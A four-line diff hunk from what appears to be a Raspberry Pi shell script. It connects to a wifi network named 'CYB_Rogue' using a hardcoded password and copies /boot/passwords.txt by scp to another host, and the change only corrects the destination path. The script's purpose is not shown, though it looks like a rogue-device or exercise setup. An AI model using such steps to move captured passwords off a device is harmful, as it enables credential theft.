@@ -109,4 +109,4 @@ sudo chown $USER /boot/passwords.txt
 
 sudo nmcli dev wifi list
 sudo nmcli dev wifi connect CYB_Rogue password D0ntT3llem1
-scp /boot/passwords.txt pi@192.168.0.5: /home/Desktop/passwords.txt
+scp /boot/passwords.txt pi@192.168.0.5: /home/pi/Desktop/passwords.txt
